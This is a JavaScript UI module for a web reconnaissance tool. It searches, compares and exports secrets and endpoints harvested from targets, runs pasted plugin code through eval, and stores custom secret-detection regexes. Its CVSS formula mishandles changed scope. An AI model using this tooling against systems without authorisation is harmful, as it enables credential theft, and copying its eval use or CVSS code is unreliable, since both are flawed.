/* ============================================================
   Web X Sider — UX & Productivity Toolkit v6.0
   Features: Error Boundary, Scan Progress, Search Results,
   Scan Comparison, CVSS Calculator, More Exports, Screenshots,
   Session Encryption, Undo/Redo, Bulk Operations, Plugin System,
   Custom Checks, Vuln DB, Wayback Deep, GitHub Dorking,
   Email/Phone Harvesting.
   ============================================================ */
(function () {
  "use strict";
  async function fetchT(url, options) { return window.fetchTarget(url, options); }

  const $ = (id) => document.getElementById(id);
  const esc = (v) => (window.escapeHtml ? window.escapeHtml(v) : String(v ?? ""));
  const badge = (l, t) => (window.badge ? window.badge(l, t) : `<span class="recon-badge ${t || "info"}">${esc(l)}</span>`);
  const toast = (m, t) => (window.showToast ? window.showToast(m, t) : console.log(m));
  const download = (name, content, type) => window.downloadFile(name, content, type);
  const delay = (ms) => new Promise(r => setTimeout(r, ms));

  function buildPanel(id, html) {
    return `<div id="tk-panel-${id}" class="tk-panel" style="display:none;">${html}</div>`;
  }

  const TK6_KEY = "web-x-sider:toolkit6";
  function tk6Load() { try { return JSON.parse(localStorage.getItem(TK6_KEY) || "{}"); } catch { return {}; } }
  function tk6Save(d) { try { localStorage.setItem(TK6_KEY, JSON.stringify(d)); } catch {} }
  function tk6Get(s) { return tk6Load()[s] || {}; }
  function tk6Set(s, v) { const d = tk6Load(); d[s] = v; tk6Save(d); }

  /* ============================================================
     P3-13: ERROR BOUNDARY
     ============================================================ */
  function initErrorBoundary() {
    window.addEventListener("error", function (e) {
      const errEl = document.createElement("div");
      errEl.className = "error-boundary-toast";
      errEl.innerHTML = `<strong>Runtime Error</strong><br><code>${esc(e.message || "Unknown")} (${e.filename || ""}:${e.lineno || ""}:${e.colno || ""})</code><button onclick="this.parentElement.remove()" class="btn btn-sm">&times;</button>`;
      document.body.appendChild(errEl);
      setTimeout(() => errEl.remove(), 10000);
    });

    window.addEventListener("unhandledrejection", function (e) {
      const errEl = document.createElement("div");
      errEl.className = "error-boundary-toast";
      errEl.innerHTML = `<strong>Unhandled Promise</strong><br><code>${esc(String(e.reason?.message || e.reason || "Unknown"))}</code><button onclick="this.parentElement.remove()" class="btn btn-sm">&times;</button>`;
      document.body.appendChild(errEl);
      setTimeout(() => errEl.remove(), 8000);
    });
  }

  /* ============================================================
     P3-14: REAL-TIME SCAN PROGRESS
     ============================================================ */
  function scanProgressPanelHTML() {
    return buildPanel("scanprogress", `
      <div class="scanprogress-section">
        <h3><i class="fas fa-spinner"></i> Scan Progress</h3>
        <div class="scanprogress-bar-container">
          <div class="scanprogress-bar" id="scanProgressBar" style="width:0%;"></div>
        </div>
        <div class="scanprogress-stats">
          <span id="scanProgressPct">0%</span>
          <span id="scanProgressEta">ETA: calculating...</span>
          <span id="scanProgressCount">0/0 URLs</span>
          <span id="scanProgressSpeed">0 req/s</span>
        </div>
        <div id="scanProgressLog" class="scanprogress-log" style="max-height:300px;overflow-y:auto;margin-top:12px;"></div>
      </div>
    `);
  }

  let scanStartTime = 0;
  let scanTotal = 0;
  let scanDone = 0;

  function updateScanProgress(done, total, url, status) {
    scanTotal = total;
    scanDone = done;
    if (scanStartTime === 0) scanStartTime = Date.now();

    const pct = total > 0 ? Math.round((done / total) * 100) : 0;
    const elapsed = (Date.now() - scanStartTime) / 1000;
    const speed = elapsed > 0 ? (done / elapsed).toFixed(1) : "0";
    const remaining = speed > 0 ? Math.round((total - done) / parseFloat(speed)) : 0;
    const eta = remaining > 60 ? `${Math.floor(remaining / 60)}m ${remaining % 60}s` : `${remaining}s`;

    const bar = $("scanProgressBar");
    if (bar) bar.style.width = pct + "%";
    const pctEl = $("scanProgressPct");
    if (pctEl) pctEl.textContent = pct + "%";
    const etaEl = $("scanProgressEta");
    if (etaEl) etaEl.textContent = `ETA: ${eta}`;
    const countEl = $("scanProgressCount");
    if (countEl) countEl.textContent = `${done}/${total} URLs`;
    const speedEl = $("scanProgressSpeed");
    if (speedEl) speedEl.textContent = `${speed} req/s`;

    if (url) {
      const log = $("scanProgressLog");
      if (log) {
        const entry = document.createElement("div");
        entry.className = "scanprogress-entry";
        entry.innerHTML = `<span class="scanprogress-status ${status === 200 ? 'status-200' : status === 403 ? 'status-403' : ''}">${status || "..."}</span> <span class="scanprogress-url">${esc(url)}</span>`;
        log.appendChild(entry);
        log.scrollTop = log.scrollHeight;
      }
    }
  }

  window._updateScanProgress = updateScanProgress;
  window._resetScanProgress = () => { scanStartTime = 0; scanTotal = 0; scanDone = 0; };

  /* ============================================================
     P3-15: SEARCHABLE RESULTS
     ============================================================ */
  function searchPanelHTML() {
    return buildPanel("search", `
      <div class="search-section">
        <h3><i class="fas fa-search"></i> Search Results</h3>
        <div class="search-form">
          <input type="text" id="resultSearchInput" placeholder="Search in endpoints, secrets, files, parameters..." style="width:100%;" />
          <div class="search-filters" style="margin-top:8px;">
            <label><input type="checkbox" id="searchEndpoints" checked /> Endpoints</label>
            <label><input type="checkbox" id="searchSecrets" checked /> Secrets</label>
            <label><input type="checkbox" id="searchFiles" checked /> Files</label>
            <label><input type="checkbox" id="searchParams" checked /> Parameters</label>
          </div>
          <button id="searchBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-search"></i><span>Search</span></button>
        </div>
        <div id="searchResults" class="search-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  function runSearch() {
    const query = $("resultSearchInput")?.value?.trim()?.toLowerCase();
    if (!query) { toast("Enter a search term", "error"); return; }

    const state = window.state || {};
    const results = [];

    if ($("searchEndpoints")?.checked && state.endpoints) {
      [...state.endpoints].forEach(ep => {
        const str = typeof ep === "string" ? ep : JSON.stringify(ep);
        if (str.toLowerCase().includes(query)) results.push({ type: "endpoint", value: str });
      });
    }
    if ($("searchSecrets")?.checked && state.secrets) {
      [...state.secrets].forEach(s => {
        const str = typeof s === "string" ? s : JSON.stringify(s);
        if (str.toLowerCase().includes(query)) results.push({ type: "secret", value: str });
      });
    }
    if ($("searchFiles")?.checked && state.files) {
      [...state.files].forEach(f => {
        const str = typeof f === "string" ? f : JSON.stringify(f);
        if (str.toLowerCase().includes(query)) results.push({ type: "file", value: str });
      });
    }
    if ($("searchParams")?.checked && state.parameters) {
      [...state.parameters].forEach(p => {
        const str = typeof p === "string" ? p : JSON.stringify(p);
        if (str.toLowerCase().includes(query)) results.push({ type: "parameter", value: str });
      });
    }

    $("searchResults").innerHTML = results.length === 0
      ? '<p class="dash-empty">No results found</p>'
      : `<p>${results.length} results</p>` + results.map(r => `
        <div class="search-result-item">
          <span class="search-result-type badge ${r.type}">${r.type}</span>
          <code class="search-result-value">${esc(r.value.slice(0, 200))}</code>
        </div>
      `).join("");
  }

  /* ============================================================
     P3-16: SCAN COMPARISON UI
     ============================================================ */
  function scanComparePanelHTML() {
    return buildPanel("scancompare", `
      <div class="scancompare-section">
        <h3><i class="fas fa-columns"></i> Scan Comparison</h3>
        <p class="tool-desc">Compare two scans side-by-side to find new findings</p>
        <div class="scancompare-select">
          <label>Scan A:</label>
          <select id="scanCompareA" style="width:200px;"></select>
          <label>Scan B:</label>
          <select id="scanCompareB" style="width:200px;"></select>
          <button id="scanCompareBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-exchange-alt"></i><span>Compare</span></button>
        </div>
        <div id="scanCompareResults" class="scancompare-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  function renderScanCompareSelects() {
    const sessions = JSON.parse(localStorage.getItem("web-x-sider:sessions") || "{}");
    const names = Object.keys(sessions).sort().reverse();
    ["scanCompareA", "scanCompareB"].forEach((id, idx) => {
      const sel = $(id);
      if (!sel) return;
      sel.innerHTML = names.map((n, i) => `<option value="${n}" ${i === idx ? "selected" : ""}>${esc(n)}</option>`).join("");
    });
  }

  function compareScans() {
    const nameA = $("scanCompareA")?.value;
    const nameB = $("scanCompareB")?.value;
    if (!nameA || !nameB) { toast("Select two scans", "error"); return; }

    const sessions = JSON.parse(localStorage.getItem("web-x-sider:sessions") || "{}");
    const scanA = sessions[nameA];
    const scanB = sessions[nameB];
    if (!scanA || !scanB) { toast("Invalid scan selected", "error"); return; }

    const epsA = new Set(scanA.endpoints || []);
    const epsB = new Set(scanB.endpoints || []);
    const secretsA = new Set(scanA.secrets || []);
    const secretsB = new Set(scanB.secrets || []);

    const newInB = [...epsB].filter(e => !epsA.has(e));
    const removedFromA = [...epsA].filter(e => !epsB.has(e));
    const newSecrets = [...secretsB].filter(s => !secretsA.has(s));

    $("scanCompareResults").innerHTML = `
      <h4>Comparison: ${esc(nameA)} vs ${esc(nameB)}</h4>
      <div class="scancompare-stats">
        <div><strong>Scan A:</strong> ${epsA.size} endpoints, ${secretsA.size} secrets</div>
        <div><strong>Scan B:</strong> ${epsB.size} endpoints, ${secretsB.size} secrets</div>
      </div>
      <div class="scancompare-diff">
        <h5>New in B (${newInB.length})</h5>
        ${newInB.length === 0 ? '<p class="dash-empty">No new endpoints</p>' :
          newInB.slice(0, 50).map(e => `<div class="scancompare-new"><span class="badge success">NEW</span> <code>${esc(e)}</code></div>`).join("")}
        <h5>Removed from A (${removedFromA.length})</h5>
        ${removedFromA.length === 0 ? '<p class="dash-empty">No removed endpoints</p>' :
          removedFromA.slice(0, 50).map(e => `<div class="scancompare-removed"><span class="badge danger">REMOVED</span> <code>${esc(e)}</code></div>`).join("")}
        <h5>New Secrets (${newSecrets.length})</h5>
        ${newSecrets.length === 0 ? '<p class="dash-empty">No new secrets</p>' :
          newSecrets.slice(0, 50).map(s => `<div class="scancompare-secret"><span class="badge warning">SECRET</span> <code>${esc(s)}</code></div>`).join("")}
      </div>
    `;
  }

  /* ============================================================
     P3-17: CVSS CALCULATOR
     ============================================================ */
  function cvssPanelHTML() {
    return buildPanel("cvss", `
      <div class="cvss-section">
        <h3><i class="fas fa-calculator"></i> CVSS Calculator</h3>
        <p class="tool-desc">Calculate CVSS v3.1 scores for vulnerability severity</p>
        <div class="cvss-form">
          <div class="cvss-metrics">
            <label>Attack Vector (AV):</label>
            <select id="cvssAV"><option value="N">Network</option><option value="A">Adjacent</option><option value="L">Local</option><option value="P">Physical</option></select>
            <label>Attack Complexity (AC):</label>
            <select id="cvssAC"><option value="L">Low</option><option value="H">High</option></select>
            <label>Privileges Required (PR):</label>
            <select id="cvssPR"><option value="N">None</option><option value="L">Low</option><option value="H">High</option></select>
            <label>User Interaction (UI):</label>
            <select id="cvssUI"><option value="N">None</option><option value="R">Required</option></select>
            <label>Scope (S):</label>
            <select id="cvssS"><option value="U">Unchanged</option><option value="C">Changed</option></select>
            <label>Confidentiality (C):</label>
            <select id="cvssC"><option value="N">None</option><option value="L">Low</option><option value="H">High</option></select>
            <label>Integrity (I):</label>
            <select id="cvssI"><option value="N">None</option><option value="L">Low</option><option value="H">High</option></select>
            <label>Availability (A):</label>
            <select id="cvssA"><option value="N">None</option><option value="L">Low</option><option value="H">High</option></select>
          </div>
          <button id="cvssCalcBtn" class="btn btn-primary" style="margin-top:12px;"><i class="fas fa-calculator"></i><span>Calculate</span></button>
        </div>
        <div id="cvssResult" class="cvss-result" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const CVSS_WEIGHTS = {
    AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.20 },
    AC: { L: 0.77, H: 0.44 },
    PR: { N: { U: 0.85, C: 0.85 }, L: { U: 0.62, C: 0.68 }, H: { U: 0.27, C: 0.50 } },
    UI: { N: 0.85, R: 0.62 },
    C: { N: 0, L: 0.22, H: 0.56 },
    I: { N: 0, L: 0.22, H: 0.56 },
    A: { N: 0, L: 0.22, H: 0.56 }
  };

  function calculateCVSS() {
    const av = $("cvssAV")?.value || "N";
    const ac = $("cvssAC")?.value || "L";
    const pr = $("cvssPR")?.value || "N";
    const ui = $("cvssUI")?.value || "N";
    const s = $("cvssS")?.value || "U";
    const c = $("cvssC")?.value || "N";
    const i = $("cvssI")?.value || "N";
    const a = $("cvssA")?.value || "N";

    const iss = 1 - ((1 - CVSS_WEIGHTS.C[c]) * (1 - CVSS_WEIGHTS.I[i]) * (1 - CVSS_WEIGHTS.A[a]));
    const impact = s === "C" ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
    const exploitability = 8.22 * CVSS_WEIGHTS.AV[av] * CVSS_WEIGHTS.AC[ac] * CVSS_WEIGHTS.PR[pr][s] * CVSS_WEIGHTS.UI[ui];

    let score;
    if (impact <= 0) score = 0;
    else if (s === "U") score = Math.min(10, Math.ceil((impact + exploitability) * 10) / 10);
    else score = Math.min(10, Math.ceil((impact + exploitability) * 10) / 10);

    const severity = score >= 9 ? "Critical" : score >= 7 ? "High" : score >= 4 ? "Medium" : score >= 0.1 ? "Low" : "None";
    const sevClass = severity.toLowerCase();

    const vector = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${ui}/S:${s}/C:${c}/I:${i}/A:${a}`;

    $("cvssResult").innerHTML = `
      <div class="cvss-score-display">
        <div class="cvss-score-number">${score.toFixed(1)}</div>
        <div class="cvss-score-severity badge ${sevClass}">${severity}</div>
      </div>
      <div class="cvss-vector"><code>${vector}</code></div>
      <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText('${vector}').then(()=>window.showToast?.('Copied','success'))"><i class="fas fa-copy"></i> Copy Vector</button>
    `;
  }

  /* ============================================================
     P3-18: MORE EXPORT FORMATS
     ============================================================ */
  function moreExportsPanelHTML() {
    return buildPanel("moreexports", `
      <div class="moreexports-section">
        <h3><i class="fas fa-file-export"></i> Additional Export Formats</h3>
        <div class="moreexports-grid">
          <button class="export-btn" data-format="nmap"><i class="fas fa-network-wired"></i><span>Nmap XML</span></button>
          <button class="export-btn" data-format="nikto"><i class="fas fa-server"></i><span>Nikto CSV</span></button>
          <button class="export-btn" data-format="nessus"><i class="fas fa-shield-alt"></i><span>Nessus</span></button>
          <button class="export-btn" data-format="markdown"><i class="fas fa-file-alt"></i><span>Markdown Report</span></button>
          <button class="export-btn" data-format="htmltable"><i class="fas fa-table"></i><span>HTML Table</span></button>
          <button class="export-btn" data-format="csvfull"><i class="fas fa-file-csv"></i><span>Full CSV</span></button>
        </div>
      </div>
    `);
  }

  function exportNmapXML() {
    const state = window.state || {};
    const endpoints = state.endpoints ? [...state.endpoints] : [];
    let xml = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE nmaprun>\n<nmaprun>\n';
    endpoints.forEach(ep => {
      const url = typeof ep === "string" ? ep : ep.url || ep.path || "";
      try {
        const u = new URL(url);
        xml += `  <host>\n    <address addr="${esc(u.hostname)}"/>\n    <ports>\n      <port protocol="tcp" portid="${u.port || (u.protocol === "https" ? "443" : "80")}">\n        <state state="open"/>\n        <service name="http"/>\n      </port>\n    </ports>\n  </host>\n`;
      } catch {}
    });
    xml += '</nmaprun>';
    download(`nmap-export-${Date.now()}.xml`, xml, "application/xml");
    toast(`Exported ${endpoints.length} hosts to Nmap XML`, "success");
  }

  function exportNiktoCSV() {
    const state = window.state || {};
    const endpoints = state.endpoints ? [...state.endpoints] : [];
    let csv = "Host,Port,URI,Description,OSVDB\n";
    endpoints.forEach(ep => {
      const url = typeof ep === "string" ? ep : ep.url || ep.path || "";
      try {
        const u = new URL(url);
        csv += `${u.hostname},${u.port || 80},${u.pathname},Discovered endpoint,\n`;
      } catch {}
    });
    download(`nikto-export-${Date.now()}.csv`, csv, "text/csv");
    toast(`Exported to Nikto CSV`, "success");
  }

  function exportNessus() {
    const state = window.state || {};
    const secrets = state.secrets ? [...state.secrets] : [];
    let xml = '<?xml version="1.0" encoding="UTF-8"?>\n<NessusClientData>\n';
    secrets.forEach(s => {
      const val = typeof s === "string" ? s : s.value || "";
      xml += `  <ReportItem severity="3" pluginName="Secret Found" description="${esc(val)}"/>\n`;
    });
    xml += '</NessusClientData>';
    download(`nessus-export-${Date.now()}.nessus`, xml, "application/xml");
    toast(`Exported ${secrets.length} findings to Nessus`, "success");
  }

  function exportMarkdownReport() {
    const state = window.state || {};
    let md = `# Web X Sider Report\n\n`;
    md += `**Generated:** ${new Date().toISOString()}\n`;
    md += `**Target:** ${location.href}\n\n`;
    md += `## Summary\n\n`;
    md += `- Endpoints: ${state.endpoints?.size || 0}\n`;
    md += `- Secrets: ${state.secrets?.size || 0}\n`;
    md += `- Files: ${state.files?.size || 0}\n`;
    md += `- Parameters: ${state.parameters?.size || 0}\n\n`;

    if (state.secrets?.size > 0) {
      md += `## Secrets Found\n\n`;
      [...state.secrets].forEach(s => {
        md += `- \`${esc(typeof s === "string" ? s : s.value || "")}\`\n`;
      });
      md += "\n";
    }

    if (state.endpoints?.size > 0) {
      md += `## Endpoints\n\n`;
      [...state.endpoints].slice(0, 100).forEach(e => {
        md += `- \`${esc(typeof e === "string" ? e : e.url || e.path || "")}\`\n`;
      });
      md += "\n";
    }

    download(`report-${Date.now()}.md`, md, "text/markdown");
    toast("Markdown report exported", "success");
  }

  function exportHTMLTable() {
    const state = window.state || {};
    let html = `<html><head><title>Web X Sider Report</title><style>body{font-family:sans-serif;padding:20px;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:8px;text-align:left;}th{background:#333;color:#fff;}tr:nth-child(even){background:#f2f2f2;}</style></head><body>`;
    html += `<h1>Web X Sider Report</h1><p>Generated: ${new Date().toISOString()}</p>`;

    if (state.secrets?.size > 0) {
      html += `<h2>Secrets</h2><table><tr><th>Secret</th><th>Severity</th></tr>`;
      [...state.secrets].forEach(s => {
        const val = typeof s === "string" ? s : s.value || "";
        const sev = typeof s === "object" ? s.severity || "info" : "info";
        html += `<tr><td><code>${esc(val)}</code></td><td>${esc(sev)}</td></tr>`;
      });
      html += `</table>`;
    }

    if (state.endpoints?.size > 0) {
      html += `<h2>Endpoints</h2><table><tr><th>URL</th><th>Method</th></tr>`;
      [...state.endpoints].slice(0, 200).forEach(e => {
        const url = typeof e === "string" ? e : e.url || e.path || "";
        const method = typeof e === "object" ? e.method || "GET" : "GET";
        html += `<tr><td><code>${esc(url)}</code></td><td>${esc(method)}</td></tr>`;
      });
      html += `</table>`;
    }

    html += `</body></html>`;
    download(`report-${Date.now()}.html`, html, "text/html");
    toast("HTML table report exported", "success");
  }

  function exportFullCSV() {
    const state = window.state || {};
    let csv = "Type,Value,Severity,Context\n";

    if (state.endpoints) {
      [...state.endpoints].forEach(e => {
        const url = typeof e === "string" ? e : e.url || e.path || "";
        const method = typeof e === "object" ? e.method || "GET" : "GET";
        csv += `endpoint,"${url}",info,${method}\n`;
      });
    }
    if (state.secrets) {
      [...state.secrets].forEach(s => {
        const val = typeof s === "string" ? s : s.value || "";
        const sev = typeof s === "object" ? s.severity || "info" : "info";
        csv += `secret,"${val}",${sev},\n`;
      });
    }
    if (state.files) {
      [...state.files].forEach(f => {
        const val = typeof f === "string" ? f : f.value || "";
        csv += `file,"${val}",info,\n`;
      });
    }
    if (state.parameters) {
      [...state.parameters].forEach(p => {
        const val = typeof p === "string" ? p : p.name || p.value || "";
        csv += `parameter,"${val}",info,\n`;
      });
    }

    download(`full-export-${Date.now()}.csv`, csv, "text/csv");
    toast("Full CSV exported", "success");
  }

  /* ============================================================
     P3-19: SCREENSHOT INTEGRATION
     ============================================================ */
  function screenshotPanelHTML() {
    return buildPanel("screenshot", `
      <div class="screenshot-section">
        <h3><i class="fas fa-camera"></i> Screenshot Integration</h3>
        <p class="tool-desc">Capture screenshots of discovered endpoints via external services</p>
        <div class="screenshot-form">
          <label>Target URL:</label>
          <input type="text" id="screenshotUrl" placeholder="https://target.com" style="width:100%;" />
          <div style="margin-top:12px;">
            <button id="screenshotBtn" class="btn btn-primary"><i class="fas fa-camera"></i><span>Capture</span></button>
          </div>
        </div>
        <div id="screenshotResult" class="screenshot-result" style="margin-top:16px;"></div>
      </div>
    `);
  }

  function captureScreenshot() {
    const url = $("screenshotUrl")?.value?.trim();
    if (!url) { toast("Enter a URL", "error"); return; }

    const encoded = encodeURIComponent(url);
    const services = [
      { name: "Google Screenshot", url: `https://image.thum.io/get/width/1200/crop/800/${url}` },
      { name: "Microlink", url: `https://api.microlink.io/?url=${encoded}&screenshot=true&meta=false&embed=screenshot.url` },
      { name: "Screenshotone", url: `https://image.thum.io/get/width/1200/${url}` }
    ];

    $("screenshotResult").innerHTML = services.map(s => `
      <div class="screenshot-service">
        <h5>${esc(s.name)}</h5>
        <img src="${esc(s.url)}" alt="Screenshot" style="max-width:100%;border-radius:8px;border:1px solid var(--border);" onerror="this.style.display='none'" />
        <a href="${esc(s.url)}" target="_blank" class="btn btn-sm btn-secondary" style="margin-top:8px;"><i class="fas fa-external-link-alt"></i> Open</a>
      </div>
    `).join("");
  }

  /* ============================================================
     P3-20: SESSION ENCRYPTION
     ============================================================ */
  async function encryptData(data, password) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(password), "PBKDF2", false, ["deriveKey"]);
    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: enc.encode("web-x-sider-salt"), iterations: 100000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(JSON.stringify(data)));
    return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
  }

  async function decryptData(encrypted, password) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(password), "PBKDF2", false, ["deriveKey"]);
    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: enc.encode("web-x-sider-salt"), iterations: 100000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: new Uint8Array(encrypted.iv) }, key, new Uint8Array(encrypted.data));
    return JSON.parse(new TextDecoder().decode(decrypted));
  }

  /* ============================================================
     P3-21: UNDO/REDO
     ============================================================ */
  const undoStack = [];
  const redoStack = [];
  const MAX_UNDO = 50;

  function pushUndo(action) {
    undoStack.push(action);
    if (undoStack.length > MAX_UNDO) undoStack.shift();
    redoStack.length = 0;
  }

  function undo() {
    if (undoStack.length === 0) { toast("Nothing to undo", "info"); return; }
    const action = undoStack.pop();
    redoStack.push(action);
    action.undo();
    toast("Undone", "info");
  }

  function redo() {
    if (redoStack.length === 0) { toast("Nothing to redo", "info"); return; }
    const action = redoStack.pop();
    undoStack.push(action);
    action.redo();
    toast("Redone", "info");
  }

  window._pushUndo = pushUndo;
  window._undo = undo;
  window._redo = redo;

  /* ============================================================
     P3-22: BULK OPERATIONS
     ============================================================ */
  function bulkOpsPanelHTML() {
    return buildPanel("bulkops", `
      <div class="bulkops-section">
        <h3><i class="fas fa-check-double"></i> Bulk Operations</h3>
        <p class="tool-desc">Select and operate on multiple endpoints at once</p>
        <div class="bulkops-actions">
          <button id="bulkSelectAll" class="btn btn-secondary"><i class="fas fa-check-square"></i><span>Select All</span></button>
          <button id="bulkDeselectAll" class="btn btn-secondary"><i class="fas fa-square"></i><span>Deselect All</span></button>
          <button id="bulkExportSelected" class="btn btn-primary"><i class="fas fa-download"></i><span>Export Selected</span></button>
          <button id="bulkTestSelected" class="btn btn-primary"><i class="fas fa-play"></i><span>Test Selected</span></button>
          <button id="bulkDeleteSelected" class="btn btn-danger"><i class="fas fa-trash"></i><span>Delete Selected</span></button>
        </div>
        <div id="bulkEndpointsList" class="bulkops-list" style="margin-top:16px;"></div>
      </div>
    `);
  }

  function renderBulkList() {
    const state = window.state || {};
    const endpoints = state.endpoints ? [...state.endpoints] : [];
    const list = $("bulkEndpointsList");
    if (!list) return;

    list.innerHTML = endpoints.length === 0
      ? '<p class="dash-empty">No endpoints to select</p>'
      : endpoints.map((ep, i) => {
          const url = typeof ep === "string" ? ep : ep.url || ep.path || "";
          return `<label class="bulkops-item"><input type="checkbox" class="bulk-check" data-index="${i}" data-url="${esc(url)}" /> <code>${esc(url)}</code></label>`;
        }).join("");
  }

  /* ============================================================
     P4-23: PLUGIN SYSTEM
     ============================================================ */
  function pluginPanelHTML() {
    return buildPanel("plugins", `
      <div class="plugin-section">
        <h3><i class="fas fa-puzzle-piece"></i> Plugin System</h3>
        <p class="tool-desc">Load custom plugins to extend Web X Sider functionality</p>
        <div class="plugin-form">
          <textarea id="pluginCode" rows="8" placeholder="// Plugin code here\n// Access: window.state (endpoints, secrets, files, parameters)\n// Use: window.showToast(message, type)\n// Use: window.downloadFile(name, content, type)\n\n(function() {\n  console.log('Plugin loaded!');\n})();\n" style="width:100%;font-family:monospace;"></textarea>
          <div style="margin-top:8px;">
            <button id="pluginRun" class="btn btn-primary"><i class="fas fa-play"></i><span>Run Plugin</span></button>
            <button id="pluginSave" class="btn btn-secondary"><i class="fas fa-save"></i><span>Save Plugin</span></button>
            <button id="pluginLoad" class="btn btn-secondary"><i class="fas fa-folder-open"></i><span>Load Saved</span></button>
          </div>
        </div>
        <div id="pluginSaved" class="plugin-saved" style="margin-top:16px;"></div>
      </div>
    `);
  }

  function runPlugin() {
    const code = $("pluginCode")?.value;
    if (!code) { toast("Enter plugin code", "error"); return; }
    try {
      eval(code);
      toast("Plugin executed successfully", "success");
    } catch (e) {
      toast(`Plugin error: ${e.message}`, "error");
    }
  }

  function savePlugin() {
    const code = $("pluginCode")?.value;
    const name = prompt("Plugin name:");
    if (!name || !code) return;
    const plugins = JSON.parse(localStorage.getItem("web-x-sider:plugins") || "{}");
    plugins[name] = { code, created: Date.now() };
    localStorage.setItem("web-x-sider:plugins", JSON.stringify(plugins));
    toast(`Plugin "${name}" saved`, "success");
    renderSavedPlugins();
  }

  function renderSavedPlugins() {
    const plugins = JSON.parse(localStorage.getItem("web-x-sider:plugins") || "{}");
    const container = $("pluginSaved");
    if (!container) return;
    const names = Object.keys(plugins);
    container.innerHTML = names.length === 0
      ? '<p class="dash-empty">No saved plugins</p>'
      : `<h4>Saved Plugins (${names.length})</h4>` + names.map(n => `
        <div class="plugin-item">
          <span>${esc(n)}</span>
          <button class="btn btn-sm btn-primary" onclick="document.getElementById('pluginCode').value=window._getPlugin('${esc(n)}');window.showToast?.('Loaded','success')"><i class="fas fa-upload"></i></button>
          <button class="btn btn-sm btn-danger" onclick="window._deletePlugin('${esc(n)}')"><i class="fas fa-trash"></i></button>
        </div>
      `).join("");
  }

  window._getPlugin = (name) => {
    const plugins = JSON.parse(localStorage.getItem("web-x-sider:plugins") || "{}");
    return plugins[name]?.code || "";
  };

  window._deletePlugin = (name) => {
    const plugins = JSON.parse(localStorage.getItem("web-x-sider:plugins") || "{}");
    delete plugins[name];
    localStorage.setItem("web-x-sider:plugins", JSON.stringify(plugins));
    toast(`Plugin "${name}" deleted`, "info");
    renderSavedPlugins();
  };

  /* ============================================================
     P4-24: CUSTOM CHECK EDITOR
     ============================================================ */
  function customChecksPanelHTML() {
    return buildPanel("customchecks", `
      <div class="customchecks-section">
        <h3><i class="fas fa-edit"></i> Custom Secret Detection Rules</h3>
        <p class="tool-desc">Add custom regex patterns for secret detection</p>
        <div class="customchecks-form">
          <label>Rule Name:</label>
          <input type="text" id="customCheckName" placeholder="My Custom Check" style="width:300px;" />
          <label>Regex Pattern:</label>
          <input type="text" id="customCheckRegex" placeholder="(my[_-]?secret[_-]?key[\\s]*[=:]+\\s*['\"]?[^'\"\\s]+)" style="width:100%;font-family:monospace;" />
          <label>Severity:</label>
          <select id="customCheckSeverity"><option value="critical">Critical</option><option value="high">High</option><option value="medium" selected>Medium</option><option value="low">Low</option></select>
          <div style="margin-top:8px;">
            <button id="customCheckAdd" class="btn btn-primary"><i class="fas fa-plus"></i><span>Add Rule</span></button>
          </div>
        </div>
        <div id="customChecksList" class="customchecks-list" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const CUSTOM_CHECKS_KEY = "web-x-sider:custom-checks";

  function loadCustomChecks() {
    try { return JSON.parse(localStorage.getItem(CUSTOM_CHECKS_KEY) || "[]"); } catch { return []; }
  }

  function saveCustomChecks(checks) {
    localStorage.setItem(CUSTOM_CHECKS_KEY, JSON.stringify(checks));
  }

  function addCustomCheck() {
    const name = $("customCheckName")?.value?.trim();
    const regex = $("customCheckRegex")?.value?.trim();
    const severity = $("customCheckSeverity")?.value || "medium";
    if (!name || !regex) { toast("Fill in name and regex", "error"); return; }

    try { new RegExp(regex); } catch { toast("Invalid regex pattern", "error"); return; }

    const checks = loadCustomChecks();
    checks.push({ name, regex, severity, created: Date.now() });
    saveCustomChecks(checks);
    toast(`Custom check "${name}" added`, "success");
    $("customCheckName").value = "";
    $("customCheckRegex").value = "";
    renderCustomChecks();
  }

  function renderCustomChecks() {
    const checks = loadCustomChecks();
    const list = $("customChecksList");
    if (!list) return;
    list.innerHTML = checks.length === 0
      ? '<p class="dash-empty">No custom rules</p>'
      : checks.map((c, i) => `
        <div class="customcheck-item">
          <span class="customcheck-name">${esc(c.name)}</span>
          <code class="customcheck-regex">${esc(c.regex)}</code>
          <span class="badge ${c.severity}">${c.severity}</span>
          <button class="btn btn-sm btn-danger" onclick="window._deleteCustomCheck(${i})"><i class="fas fa-trash"></i></button>
        </div>
      `).join("");
  }

  window._deleteCustomCheck = (index) => {
    const checks = loadCustomChecks();
    checks.splice(index, 1);
    saveCustomChecks(checks);
    toast("Rule deleted", "info");
    renderCustomChecks();
  };

  /* ============================================================
     P4-25: VULN DATABASE
     ============================================================ */
  function vulnDbPanelHTML() {
    return buildPanel("vulndb", `
      <div class="vulndb-section">
        <h3><i class="fas fa-bug"></i> Vulnerability Reference Database</h3>
        <input type="text" id="vulnDbSearch" placeholder="Search CVEs, techniques..." style="width:100%;margin-bottom:12px;" />
        <div id="vulnDbResults" class="vulndb-results"></div>
      </div>
    `);
  }

